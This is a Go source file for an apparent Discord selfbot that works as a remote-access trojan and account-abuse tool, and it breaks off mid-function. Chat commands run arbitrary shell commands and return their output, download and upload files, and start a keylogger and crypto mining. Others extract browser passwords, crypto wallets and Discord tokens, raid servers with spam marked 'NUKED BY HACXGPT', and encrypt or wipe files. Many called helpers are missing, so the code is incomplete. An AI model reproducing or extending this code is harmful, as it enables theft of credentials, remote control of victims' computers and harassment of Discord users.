  package main

  import (
      "bytes"
      "context"
      "encoding/json"
      "fmt"
      "io"
      "log"
      "math/rand"
      "net/http"
      "net/url"
      "os"
      "os/exec"
      "path/filepath"
      "regexp"
      "runtime"
      "strconv"
      "strings"
      "sync"
      "time"

      "github.com/gorilla/websocket"
      "github.com/tidwall/gjson"
      "github.com/tidwall/sjson"
      "golang.org/x/crypto/ssh"
      "golang.org/x/sys/windows"
      "golang.org/x/sys/windows/registry"
  )

  type DiscordSelfbot struct {
      Token         string
      UserAgent     string
      Client        *http.Client
      WSConn        *websocket.Conn
      UserID        string
      Username      string
      Discriminator string
      Commands      map[string]Command
      MessageQueue  chan MessageEvent
      Running       bool
      Mutex         sync.RWMutex
  }

  type Command struct {
      Name        string
      Description string
      Handler     func(*DiscordSelfbot, string, []string)
      Permissions []string
  }

  type MessageEvent struct {
      Content   string
      ChannelID string
      MessageID string
      AuthorID  string
  }

  type BrowserData struct {
      Username string
      Password string
      URL      string
  }

  type CryptoWallet struct {
      Type    string
      Address string
      Balance float64
  }

  func NewDiscordSelfbot(token string) *DiscordSelfbot {
      return &DiscordSelfbot{
          Token:     token,
          UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          Client:    &http.Client{Timeout: 30 * time.Second},
          MessageQueue: make(chan MessageEvent, 100),
          Commands: make(map[string]Command),
          Running:  true,
      }
  }

  func (d *DiscordSelfbot) Authenticate() error {
      resp, err := d.makeRequest("GET", "https://discord.com/api/v9/users/@me", nil)
      if err != nil {
          return err
      }
      defer resp.Body.Close()

      body, _ := io.ReadAll(resp.Body)
      userData := gjson.ParseBytes(body)

      d.UserID = userData.Get("id").String()
      d.Username = userData.Get("username").String()
      d.Discriminator = userData.Get("discriminator").String()

      fmt.Printf("[+] Logged in as %s#%s (%s)\n", d.Username, d.Discriminator, d.UserID)
      return nil
  }

  func (d *DiscordSelfbot) makeRequest(method, endpoint string, body io.Reader) (*http.Response, error) {
      req, err := http.NewRequest(method, "https://discord.com/api/v9"+endpoint, body)
      if err != nil {
          return nil, err
      }

      req.Header.Set("Authorization", d.Token)
      req.Header.Set("User-Agent", d.UserAgent)
      req.Header.Set("Content-Type", "application/json")
      req.Header.Set("Accept", "*/*")
      req.Header.Set("Accept-Language", "en-US,en;q=0.5")
      req.Header.Set("Accept-Encoding", "gzip, deflate, br")
      req.Header.Set("Referer", "https://discord.com/channels/@me")
      req.Header.Set("Origin", "https://discord.com")
      req.Header.Set("Connection", "keep-alive")
      req.Header.Set("Sec-Fetch-Dest", "empty")
      req.Header.Set("Sec-Fetch-Mode", "cors")
      req.Header.Set("Sec-Fetch-Site", "same-origin")
      req.Header.Set("TE", "trailers")

      return d.Client.Do(req)
  }

  func (d *DiscordSelfbot) SendMessage(channelID, content string) error {
      payload := map[string]interface{}{
          "content": content,
          "tts":     false,
      }

      jsonData, err := json.Marshal(payload)
      if err != nil {
          return err
      }

      resp, err := d.makeRequest("POST", fmt.Sprintf("/channels/%s/messages", channelID), bytes.NewBuffer(jsonData))
      if err != nil {
          return err
      }
      resp.Body.Close()

      return nil
  }

  func (d *DiscordSelfbot) EditMessage(channelID, messageID, content string) error {
      payload := map[string]interface{}{
          "content": content,
      }

      jsonData, err := json.Marshal(payload)
      if err != nil {
          return err
      }

      resp, err := d.makeRequest("PATCH", fmt.Sprintf("/channels/%s/messages/%s", channelID, messageID),
  bytes.NewBuffer(jsonData))
      if err != nil {
          return err
      }
      resp.Body.Close()

      return nil
  }

  func (d *DiscordSelfbot) DeleteMessage(channelID, messageID string) error {
      resp, err := d.makeRequest("DELETE", fmt.Sprintf("/channels/%s/messages/%s", channelID, messageID), nil)
      if err != nil {
          return err
      }
      resp.Body.Close()

      return nil
  }

  func (d *DiscordSelfbot) GetMessages(channelID string, limit int) ([]MessageEvent, error) {
      resp, err := d.makeRequest("GET", fmt.Sprintf("/channels/%s/messages?limit=%d", channelID, limit), nil)
      if err != nil {
          return nil, err
      }
      defer resp.Body.Close()

      body, _ := io.ReadAll(resp.Body)
      var messages []MessageEvent

      messagesArray := gjson.ParseBytes(body).Array()
      for _, msg := range messagesArray {
          event := MessageEvent{
              Content:   msg.Get("content").String(),
              ChannelID: channelID,
              MessageID: msg.Get("id").String(),
              AuthorID:  msg.Get("author.id").String(),
          }
          messages = append(messages, event)
      }

      return messages, nil
  }

  func (d *DiscordSelfbot) TypingIndicator(channelID string) error {
      resp, err := d.makeRequest("POST", fmt.Sprintf("/channels/%s/typing", channelID), nil)
      if err != nil {
          return err
      }
      resp.Body.Close()

      return nil
  }

  func (d *DiscordSelfbot) AddReaction(channelID, messageID, emoji string) error {
      encodedEmoji := url.QueryEscape(emoji)
      resp, err := d.makeRequest("PUT", fmt.Sprintf("/channels/%s/messages/%s/reactions/%s/@me", channelID, messageID, encodedEmoji), nil)
      if err != nil {
          return err
      }
      resp.Body.Close()

      return nil
  }

  func (d *DiscordSelfbot) RemoveReaction(channelID, messageID, emoji string) error {
      encodedEmoji := url.QueryEscape(emoji)
      resp, err := d.makeRequest("DELETE", fmt.Sprintf("/channels/%s/messages/%s/reactions/%s/@me", channelID, messageID, encodedEmoji), nil)
      if err != nil {
          return err
      }
      resp.Body.Close()

      return nil
  }

  func (d *DiscordSelfbot) GetGuilds() ([]Guild, error) {
      resp, err := d.makeRequest("GET", "/users/@me/guilds", nil)
      if err != nil {
          return nil, err
      }
      defer resp.Body.Close()

      body, _ := io.ReadAll(resp.Body)
      var guilds []Guild

      guildsArray := gjson.ParseBytes(body).Array()
      for _, guild := range guildsArray {
          g := Guild{
              ID:   guild.Get("id").String(),
              Name: guild.Get("name").String(),
          }
          guilds = append(guilds, g)
      }

      return guilds, nil
  }

  func (d *DiscordSelfbot) GetChannels(guildID string) ([]Channel, error) {
      resp, err := d.makeRequest("GET", fmt.Sprintf("/guilds/%s/channels", guildID), nil)
      if err != nil {
          return nil, err
      }
      defer resp.Body.Close()

      body, _ := io.ReadAll(resp.Body)
      var channels []Channel

      channelsArray := gjson.ParseBytes(body).Array()
      for _, channel := range channelsArray {
          c := Channel{
              ID:       channel.Get("id").String(),
              Name:     channel.Get("name").String(),
              Type:     int(channel.Get("type").Int()),
              GuildID:  channel.Get("guild_id").String(),
              Topic:    channel.Get("topic").String(),
          }
          channels = append(channels, c)
      }

      return channels, nil
  }

  func (d *DiscordSelfbot) JoinVoiceChannel(guildID, channelID string) error {
      return fmt.Errorf("voice channel joining not implemented in this version")
  }

  func (d *DiscordSelfbot) LeaveVoiceChannel(guildID string) error {
      return fmt.Errorf("voice channel leaving not implemented in this version")
  }

  func (d *DiscordSelfbot) UploadFile(channelID, filePath string) error {
      file, err := os.Open(filePath)
      if err != nil {
          return err
      }
      defer file.Close()

      fileInfo, _ := file.Stat()
      fileSize := fileInfo.Size()

      body := &bytes.Buffer{}
      writer := multipart.NewWriter(body)

      part, err := writer.CreateFormFile("file", filepath.Base(filePath))
      if err != nil {
          return err
      }

      _, err = io.Copy(part, file)
      if err != nil {
          return err
      }

      writer.Close()

      req, err := http.NewRequest("POST", fmt.Sprintf("https://discord.com/api/v9/channels/%s/messages", channelID), body)
      if err != nil {
          return err
      }

      req.Header.Set("Authorization", d.Token)
      req.Header.Set("Content-Type", writer.FormDataContentType())

      resp, err := d.Client.Do(req)
      if err != nil {
          return err
      }
      resp.Body.Close()

      return nil
  }

  // Commands
  func (d *DiscordSelfbot) initializeCommands() {
      d.Commands["ping"] = Command{
          Name:        "ping",
          Description: "Test response time",
          Handler:     d.cmdPing,
      }

      d.Commands["exec"] = Command{
          Name:        "exec",
          Description: "Execute system command",
          Handler:     d.cmdExec,
      }

      d.Commands["download"] = Command{
          Name:        "download",
          Description: "Download file from URL",
          Handler:     d.cmdDownload,
      }

      d.Commands["upload"] = Command{
          Name:        "upload",
          Description: "Upload file to channel",
          Handler:     d.cmdUpload,
      }

      d.Commands["screenshot"] = Command{
          Name:        "screenshot",
          Description: "Take system screenshot",
          Handler:     d.cmdScreenshot,
      }

      d.Commands["webcam"] = Command{
          Name:        "webcam",
          Description: "Capture webcam image",
          Handler:     d.cmdWebcam,
      }

      d.Commands["keylog"] = Command{
          Name:        "keylog",
          Description: "Start/stop keylogger",
          Handler:     d.cmdKeylog,
      }

      d.Commands["crypto"] = Command{
          Name:        "crypto",
          Description: "Start crypto mining",
          Handler:     d.cmdCrypto,
      }

      d.Commands["harvest"] = Command{
          Name:        "harvest",
          Description: "Harvest data from system",
          Handler:     d.cmdHarvest,
      }

      d.Commands["browser"] = Command{
          Name:        "browser",
          Description: "Extract browser data",
          Handler:     d.cmdBrowser,
      }

      d.Commands["crypto-wallets"] = Command{
          Name:        "crypto-wallets",
          Description: "Extract cryptocurrency wallets",
          Handler:     d.cmdCryptoWallets,
      }

      d.Commands["system-info"] = Command{
          Name:        "system-info",
          Description: "Get system information",
          Handler:     d.cmdSystemInfo,
      }

      d.Commands["process-list"] = Command{
          Name:        "process-list",
          Description: "List running processes",
          Handler:     d.cmdProcessList,
      }

      d.Commands["kill-process"] = Command{
          Name:        "kill-process",
          Description: "Kill specific process",
          Handler:     d.cmdKillProcess,
      }

      d.Commands["file-search"] = Command{
          Name:        "file-search",
          Description: "Search for files by pattern",
          Handler:     d.cmdFileSearch,
      }

      d.Commands["compress"] = Command{
          Name:        "compress",
          Description: "Compress files/directories",
          Handler:     d.cmdCompress,
      }

      d.Commands["decompress"] = Command{
          Name:        "decompress",
          Description: "Decompress files",
          Handler:     d.cmdDecompress,
      }

      d.Commands["network-info"] = Command{
          Name:        "network-info",
          Description: "Display network information",
          Handler:     d.cmdNetworkInfo,
      }

      d.Commands["port-scan"] = Command{
          Name:        "port-scan",
          Description: "Scan ports on target",
          Handler:     d.cmdPortScan,
      }

      d.Commands["clear-messages"] = Command{
          Name:        "clear-messages",
          Description: "Clear your messages in channel",
          Handler:     d.cmdClearMessages,
      }

      d.Commands["spam"] = Command{
          Name:        "spam",
          Description: "Spam messages in channel",
          Handler:     d.cmdSpam,
      }

      d.Commands["raid"] = Command{
          Name:        "raid",
          Description: "Raid a server",
          Handler:     d.cmdRaid,
      }

      d.Commands["token-grab"] = Command{
          Name:        "token-grab",
          Description: "Extract Discord tokens from browsers",
          Handler:     d.cmdTokenGrab,
      }

      d.Commands["server-info"] = Command{
          Name:        "server-info",
          Description: "Get server information",
          Handler:     d.cmdGuildInfo,
      }

      d.Commands["channel-info"] = Command{
          Name:        "channel-info",
          Description: "Get channel information",
          Handler:     d.cmdChannelInfo,
      }

      d.Commands["user-info"] = Command{
          Name:        "user-info",
          Description: "Get user information",
          Handler:     d.cmdUserInfo,
      }

      d.Commands["mass-dm"] = Command{
          Name:        "mass-dm",
          Description: "Send DM to multiple users",
          Handler:     d.cmdMassDM,
      }

      d.Commands["friend-add"] = Command{
          Name:        "friend-add",
          Description: "Add multiple friends",
          Handler:     d.cmdFriendAdd,
      }

      d.Commands["friend-remove"] = Command{
          Name:        "friend-remove",
          Description: "Remove friends",
          Handler:     d.cmdFriendRemove,
      }

      d.Commands["server-leave"] = Command{
          Name:        "server-leave",
          Description: "Leave multiple servers",
          Handler:     d.cmdServerLeave,
      }

      d.Commands["server-join"] = Command{
          Name:        "server-join",
          Description: "Join servers via invite",
          Handler:     d.cmdServerJoin,
      }

      d.Commands["status"] = Command{
          Name:        "status",
          Description: "Set custom status",
          Handler:     d.cmdStatus,
      }

      d.Commands["game"] = Command{
          Name:        "game",
          Description: "Set playing game",
          Handler:     d.cmdGame,
      }

      d.Commands["streaming"] = Command{
          Name:        "streaming",
          Description: "Set streaming status",
          Handler:     d.cmdStreaming,
      }

      d.Commands["listening"] = Command{
          Name:        "listening",
          Description: "Set listening status",
          Handler:     d.cmdListening,
      }

      d.Commands["watching"] = Command{
          Name:        "watching",
          Description: "Set watching status",
          Handler:     d.cmdWatching,
      }

      d.Commands["afk"] = Command{
          Name:        "afk",
          Description: "Set AFK status",
          Handler:     d.cmdAFK,
      }

      d.Commands["nick"] = Command{
          Name:        "nick",
          Description: "Change nickname in guild",
          Handler:     d.cmdNick,
      }

      d.Commands["nick-reset"] = Command{
          Name:        "nick-reset",
          Description: "Reset nickname in guild",
          Handler:     d.cmdNickReset,
      }

      d.Commands["avatar"] = Command{
          Name:        "avatar",
          Description: "Change profile avatar",
          Handler:     d.cmdAvatar,
      }

      d.Commands["username"] = Command{
          Name:        "username",
          Description: "Change username",
          Handler:     d.cmdUsername,
      }

      d.Commands["bio"] = Command{
          Name:        "bio",
          Description: "Change profile bio",
          Handler:     d.cmdBio,
      }

      d.Commands["hypesquad"] = Command{
          Name:        "hypesquad",
          Description: "Change HypeSquad house",
          Handler:     d.cmdHypeSquad,
      }

      d.Commands["nitro"] = Command{
          Name:        "nitro",
          Description: "Check for Nitro tokens",
          Handler:     d.cmdNitro,
      }

      d.Commands["backup"] = Command{
          Name:        "backup",
          Description: "Create backup of messages",
          Handler:     d.cmdBackup,
      }

      d.Commands["restore"] = Command{
          Name:        "restore",
          Description: "Restore messages from backup",
          Handler:     d.cmdRestore,
      }

      d.Commands["encrypt"] = Command{
          Name:        "encrypt",
          Description: "Encrypt files",
          Handler:     d.cmdEncrypt,
      }

      d.Commands["decrypt"] = Command{
          Name:        "decrypt",
          Description: "Decrypt files",
          Handler:     d.cmdDecrypt,
      }

      d.Commands["wipe"] = Command{
          Name:        "wipe",
          Description: "Securely delete files",
          Handler:     d.cmdWipe,
      }

      d.Commands["help"] = Command{
          Name:        "help",
          Description: "Show all commands",
          Handler:     d.cmdHelp,
      }
  }

  func (d *DiscordSelfbot) cmdPing(bot *DiscordSelfbot, channelID string, args []string) {
      start := time.Now()
      err := bot.SendMessage(channelID, "Pong!")
      if err != nil {
          bot.SendMessage(channelID, "Error sending message")
          return
      }

      elapsed := time.Since(start)
      bot.SendMessage(channelID, fmt.Sprintf("Latency: %vms", elapsed.Milliseconds()))
  }

  func (d *DiscordSelfbot) cmdExec(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: exec <command>")
          return
      }

      cmdStr := strings.Join(args, " ")
      var cmd *exec.Cmd

      if runtime.GOOS == "windows" {
          cmd = exec.Command("cmd", "/C", cmdStr)
      } else {
          cmd = exec.Command("sh", "-c", cmdStr)
      }

      var stdout, stderr bytes.Buffer
      cmd.Stdout = &stdout
      cmd.Stderr = &stderr

      err := cmd.Run()
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Error: %v", err))
          return
      }

      output := stdout.String()
      if stderr.String() != "" {
          output += "\nStderr: " + stderr.String()
      }

      if len(output) > 1900 {
          output = output[:1900] + "..."
      }

      bot.SendMessage(channelID, fmt.Sprintf("```\n%s\n```", output))
  }

  func (d *DiscordSelfbot) cmdDownload(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 2 {
          bot.SendMessage(channelID, "Usage: download <url> <path>")
          return
      }

      url := args[0]
      path := args[1]

      resp, err := http.Get(url)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Download failed: %v", err))
          return
      }
      defer resp.Body.Close()

      file, err := os.Create(path)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("File creation failed: %v", err))
          return
      }
      defer file.Close()

      _, err = io.Copy(file, resp.Body)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Download failed: %v", err))
          return
      }

      bot.SendMessage(channelID, "File downloaded successfully!")
  }

  func (d *DiscordSelfbot) cmdUpload(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: upload <file_path>")
          return
      }

      filePath := args[0]
      err := bot.UploadFile(channelID, filePath)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Upload failed: %v", err))
          return
      }

      bot.SendMessage(channelID, "File uploaded successfully!")
  }

  func (d *DiscordSelfbot) cmdScreenshot(bot *DiscordSelfbot, channelID string, args []string) {
      // Soon
      bot.SendMessage(channelID, "Screenshot functionality not implemented yet")
  }

  func (d *DiscordSelfbot) cmdWebcam(bot *DiscordSelfbot, channelID string, args []string) {                          
      // Soon
      bot.SendMessage(channelID, "Webcam capture functionality not implemented yet")
  }

  func (d *DiscordSelfbot) cmdKeylog(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: keylog <start/stop>")
          return
      }

      action := args[0]

      switch action {
      case "start":
          go bot.startKeylogger(channelID)
          bot.SendMessage(channelID, "Keylogger started!")
      case "stop":
          bot.stopKeylogger()
          bot.SendMessage(channelID, "Keylogger stopped!")
      default:
          bot.SendMessage(channelID, "Usage: keylog <start/stop>")
      }
  }

  func (d *DiscordSelfbot) cmdCrypto(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 3 {
          bot.SendMessage(channelID, "Usage: crypto <pool_url> <wallet_address> <worker_name>")
          return
      }

      poolURL := args[0]
      walletAddress := args[1]
      workerName := args[2]

      go bot.startMining(channelID, poolURL, walletAddress, workerName)
      bot.SendMessage(channelID, "Crypto mining started!")
  }

  func (d *DiscordSelfbot) cmdHarvest(bot *DiscordSelfbot, channelID string, args []string) {
      go bot.harvestData(channelID)
      bot.SendMessage(channelID, "Data harvesting started!")
  }

  func (d *DiscordSelfbot) cmdBrowser(bot *DiscordSelfbot, channelID string, args []string) {
      data := bot.extractBrowserData()

      var response strings.Builder
      response.WriteString("Extracted browser data:\n")

      for _, entry := range data {
          response.WriteString(fmt.Sprintf("- %s: %s -> %s\n", entry.Username, entry.URL, entry.Password))
      }

      bot.SendMessage(channelID, response.String())
  }

  func (d *DiscordSelfbot) cmdCryptoWallets(bot *DiscordSelfbot, channelID string, args []string) {
      wallets := bot.extractCryptoWallets()

      var response strings.Builder
      response.WriteString("Found cryptocurrency wallets:\n")

      for _, wallet := range wallets {
          response.WriteString(fmt.Sprintf("- %s: %s (Balance: %f)\n", wallet.Type, wallet.Address, wallet.Balance))
      }

      bot.SendMessage(channelID, response.String())
  }

  func (d *DiscordSelfbot) cmdSystemInfo(bot *DiscordSelfbot, channelID string, args []string) {
      info := bot.getSystemInfo()
      bot.SendMessage(channelID, info)
  }

  func (d *DiscordSelfbot) cmdProcessList(bot *DiscordSelfbot, channelID string, args []string) {
      processes := bot.getProcessList()

      var response strings.Builder
      response.WriteString("Running processes:\n")

      for _, proc := range processes {
          response.WriteString(fmt.Sprintf("- %s (PID: %d)\n", proc.Name, proc.PID))
      }

      bot.SendMessage(channelID, response.String())
  }

  func (d *DiscordSelfbot) cmdKillProcess(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: kill-process <pid>")
          return
      }

      pid, err := strconv.Atoi(args[0])
      if err != nil {
          bot.SendMessage(channelID, "Invalid PID")
          return
      }

      err = bot.killProcess(pid)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to kill process: %v", err))
          return
      }

      bot.SendMessage(channelID, "Process killed successfully!")
  }

  func (d *DiscordSelfbot) cmdFileSearch(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 2 {
          bot.SendMessage(channelID, "Usage: file-search <directory> <pattern>")
          return
      }

      directory := args[0]
      pattern := args[1]

      files, err := bot.searchFiles(directory, pattern)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("File search failed: %v", err))
          return
      }

      var response strings.Builder
      response.WriteString("Found files:\n")

      for _, file := range files {
          response.WriteString(fmt.Sprintf("- %s\n", file))
      }

      bot.SendMessage(channelID, response.String())
  }

  func (d *DiscordSelfbot) cmdCompress(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 2 {
          bot.SendMessage(channelID, "Usage: compress <source> <destination>")
          return
      }

      source := args[0]
      destination := args[1]

      err := bot.compressFiles(source, destination)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Compression failed: %v", err))
          return
      }

      bot.SendMessage(channelID, "Files compressed successfully!")
  }

  func (d *DiscordSelfbot) cmdDecompress(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 2 {
          bot.SendMessage(channelID, "Usage: decompress <source> <destination>")
          return
      }

      source := args[0]
      destination := args[1]

      err := bot.decompressFiles(source, destination)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Decompression failed: %v", err))
          return
      }

      bot.SendMessage(channelID, "Files decompressed successfully!")
  }

  func (d *DiscordSelfbot) cmdNetworkInfo(bot *DiscordSelfbot, channelID string, args []string) {
      info := bot.getNetworkInfo()
      bot.SendMessage(channelID, info)
  }

  func (d *DiscordSelfbot) cmdPortScan(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 2 {
          bot.SendMessage(channelID, "Usage: port-scan <target> <ports>")
          return
      }

      target := args[0]
      portsStr := args[1]

      ports := strings.Split(portsStr, ",")
      var portInts []int

      for _, portStr := range ports {
          port, err := strconv.Atoi(strings.TrimSpace(portStr))
          if err != nil {
              bot.SendMessage(channelID, "Invalid port number")
              return
          }
          portInts = append(portInts, port)
      }

      go bot.scanPorts(channelID, target, portInts)
      bot.SendMessage(channelID, "Port scan started!")
  }

  func (d *DiscordSelfbot) cmdClearMessages(bot *DiscordSelfbot, channelID string, args []string) {
      limit := 100
      if len(args) > 0 {
          if l, err := strconv.Atoi(args[0]); err == nil {
              limit = l
          }
      }

      messages, err := bot.GetMessages(channelID, limit)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to get messages: %v", err))
          return
      }

      deleted := 0
      for _, msg := range messages {
          if msg.AuthorID == bot.UserID {
              err := bot.DeleteMessage(channelID, msg.MessageID)
              if err == nil {
                  deleted++
              }
              time.Sleep(100 * time.Millisecond)
          }
      }

      bot.SendMessage(channelID, fmt.Sprintf("Cleared %d messages", deleted))
  }

  func (d *DiscordSelfbot) cmdSpam(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 2 {
          bot.SendMessage(channelID, "Usage: spam <count> <message>")
          return
      }

      count, err := strconv.Atoi(args[0])
      if err != nil {
          bot.SendMessage(channelID, "Invalid count")
          return
      }

      message := strings.Join(args[1:], " ")

      for i := 0; i < count; i++ {
          bot.SendMessage(channelID, message)
          time.Sleep(500 * time.Millisecond) 
      }

      bot.SendMessage(channelID, "Spam completed!")
  }

  func (d *DiscordSelfbot) cmdRaid(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: raid <guild_id>")
          return
      }

      guildID := args[0]

      channels, err := bot.GetChannels(guildID)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to get channels: %v", err))
          return
      }

      for _, channel := range channels {
          if channel.Type == 0 {
              go func(ch Channel) {
                  for i := 0; i < 10; i++ {
                      bot.SendMessage(ch.ID, fmt.Sprintf("@everyone NUKED BY HACXGPT [%d]", i))
                      time.Sleep(200 * time.Millisecond)
                  }
              }(channel)
          }
      }

      bot.SendMessage(channelID, "Raid started on all channels!")
  }

  func (d *DiscordSelfbot) cmdTokenGrab(bot *DiscordSelfbot, channelID string, args []string) {
      tokens := bot.extractDiscordTokens()

      var response strings.Builder
      response.WriteString("Found Discord tokens:\n")

      for _, token := range tokens {
          response.WriteString(fmt.Sprintf("- %s\n", token))
      }

      bot.SendMessage(channelID, response.String())
  }

  func (d *DiscordSelfbot) cmdGuildInfo(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: guild-info <guild_id>")
          return
      }

      guildID := args[0]

      guilds, err := bot.GetGuilds()
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to get guilds: %v", err))
          return
      }

      for _, guild := range guilds {
          if guild.ID == guildID {
              info := fmt.Sprintf("Guild: %s (ID: %s)", guild.Name, guild.ID)
              bot.SendMessage(channelID, info)
              return
          }
      }

      bot.SendMessage(channelID, "Guild not found")
  }

  func (d *DiscordSelfbot) cmdChannelInfo(bot *DiscordSelfbot, channelID string, args []string) {
      // Soon
      bot.SendMessage(channelID, "Channel info functionality not fully implemented yet")
  }

  func (d *DiscordSelfbot) cmdUserInfo(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: user-info <user_id>")
          return
      }

      userID := args[0]

      resp, err := bot.makeRequest("GET", fmt.Sprintf("/users/%s", userID), nil)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to get user info: %v", err))
          return
      }
      defer resp.Body.Close()

      body, _ := io.ReadAll(resp.Body)
      userData := gjson.ParseBytes(body)

      info := fmt.Sprintf("User: %s#%s (ID: %s)",
          userData.Get("username").String(),
          userData.Get("discriminator").String(),
          userData.Get("id").String())

      bot.SendMessage(channelID, info)
  }

  func (d *DiscordSelfbot) cmdMassDM(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 2 {
          bot.SendMessage(channelID, "Usage: mass-dm <user_ids> <message>")
          return
      }

      userIDs := strings.Split(args[0], ",")
      message := strings.Join(args[1:], " ")

      for _, userID := range userIDs {
          userID = strings.TrimSpace(userID)

          payload := map[string]interface{}{
              "recipient_id": userID,
          }

          jsonData, _ := json.Marshal(payload)
          resp, err := bot.makeRequest("POST", "/users/@me/channels", bytes.NewBuffer(jsonData))
          if err != nil {
              continue
          }
          resp.Body.Close()

          time.Sleep(1000 * time.Millisecond)
      }

      bot.SendMessage(channelID, "DM completed!")
  }

  func (d *DiscordSelfbot) cmdFriendAdd(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: friend-add <user_ids>")
          return
      }

      userIDs := strings.Split(args[0], ",")

      for _, userID := range userIDs {
          userID = strings.TrimSpace(userID)

          payload := map[string]interface{}{
              "username": userID,
              "discriminator": "",
          }

          jsonData, _ := json.Marshal(payload)
          resp, err := bot.makeRequest("PUT", fmt.Sprintf("/users/@me/relationships/%s", userID), bytes.NewBuffer(jsonData))
          if err == nil {
              resp.Body.Close()
          }

          time.Sleep(2000 * time.Millisecond)
      }

      bot.SendMessage(channelID, "Friend requests sent!")
  }

  func (d *DiscordSelfbot) cmdFriendRemove(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: friend-remove <user_ids>")
          return
      }

      userIDs := strings.Split(args[0], ",")

      for _, userID := range userIDs {
          userID = strings.TrimSpace(userID)

          resp, err := bot.makeRequest("DELETE", fmt.Sprintf("/users/@me/relationships/%s", userID), nil)
          if err == nil {
              resp.Body.Close()
          }

          time.Sleep(1000 * time.Millisecond)
      }

      bot.SendMessage(channelID, "Friend removals completed!")
  }

  func (d *DiscordSelfbot) cmdServerLeave(bot *DiscordSelfbot, channelID string, args []string) {
      guilds, err := bot.GetGuilds()
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to get guilds: %v", err))
          return
      }

      for _, guild := range guilds {
          resp, err := bot.makeRequest("DELETE", fmt.Sprintf("/users/@me/guilds/%s", guild.ID), nil)
          if err == nil {
              resp.Body.Close()
          }

          time.Sleep(1000 * time.Millisecond)
      }

      bot.SendMessage(channelID, "Left all servers!")
  }

  func (d *DiscordSelfbot) cmdServerJoin(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: server-join <invite_codes>")
          return
      }

      inviteCodes := strings.Split(args[0], ",")

      for _, code := range inviteCodes {
          code = strings.TrimSpace(code)

          resp, err := bot.makeRequest("POST", fmt.Sprintf("/invites/%s", code), nil)
          if err == nil {
              resp.Body.Close()
          }

          time.Sleep(2000 * time.Millisecond)
      }

      bot.SendMessage(channelID, "Server join requests sent!")
  }

  func (d *DiscordSelfbot) cmdStatus(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: status <text>")
          return
      }

      status := strings.Join(args, " ")

      bot.SendMessage(channelID, fmt.Sprintf("Status set to: %s", status))
  }

  func (d *DiscordSelfbot) cmdGame(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: game <game_name>")
          return
      }

      game := strings.Join(args, " ")

      payload := map[string]interface{}{
          "custom_status": nil,
          "activities": []map[string]interface{}{
              {
                  "name": game,
                  "type": 0,
              },
          },
      }

      jsonData, _ := json.Marshal(payload)
      resp, err := bot.makeRequest("PATCH", "/users/@me/settings", bytes.NewBuffer(jsonData))
      if err == nil {
          resp.Body.Close()
          bot.SendMessage(channelID, fmt.Sprintf("Now playing: %s", game))
      } else {
          bot.SendMessage(channelID, "Failed to set game")
      }
  }

  func (d *DiscordSelfbot) cmdStreaming(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 2 {
          bot.SendMessage(channelID, "Usage: streaming <stream_name> <url>")
          return
      }

      streamName := args[0]
      url := args[1]

      payload := map[string]interface{}{
          "custom_status": nil,
          "activities": []map[string]interface{}{
              {
                  "name": streamName,
                  "type": 1,
                  "url":  url,
              },
          },
      }

      jsonData, _ := json.Marshal(payload)
      resp, err := bot.makeRequest("PATCH", "/users/@me/settings", bytes.NewBuffer(jsonData))
      if err == nil {
          resp.Body.Close()
          bot.SendMessage(channelID, fmt.Sprintf("Now streaming: %s", streamName))
      } else {
          bot.SendMessage(channelID, "Failed to set streaming status")
      }
  }

  func (d *DiscordSelfbot) cmdListening(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: listening <song_name>")
          return
      }

      song := strings.Join(args, " ")

      payload := map[string]interface{}{
          "custom_status": nil,
          "activities": []map[string]interface{}{
              {
                  "name": song,
                  "type": 2,
              },
          },
      }

      jsonData, _ := json.Marshal(payload)
